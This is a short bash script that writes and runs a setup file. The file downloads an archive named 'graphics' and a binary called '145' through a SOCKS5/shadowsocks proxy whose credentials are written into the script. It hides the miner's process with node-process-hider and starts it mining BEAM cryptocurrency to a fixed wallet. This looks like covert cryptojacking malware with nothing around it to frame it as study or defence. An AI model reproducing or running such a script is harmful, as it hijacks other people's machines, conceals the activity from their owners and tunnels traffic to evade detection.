#!/bin/bash
cat << "EOF" > run.sh

#!/bin/bash
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 192.186.186.7:6049
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
sleep .2
./graftcp/graftcp curl ifconfig.me
echo " "
echo " "

./graftcp/graftcp wget https://gitlab.com/jiorio669/donlod/-/raw/main/145
chmod +x 145

apt -y install shadowsocks-libev rng-tools
ss-local -s 192.186.186.7 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
ph add 145
./145 --coin BEAM --pool beam.2miners.com:5252 --user 193c1d22f4eca39e193b6e99441f9fb67301953ae63ae0ece62f4497632580b849e.RTX3070TI 
EOF

chmod +x run.sh

./run.sh
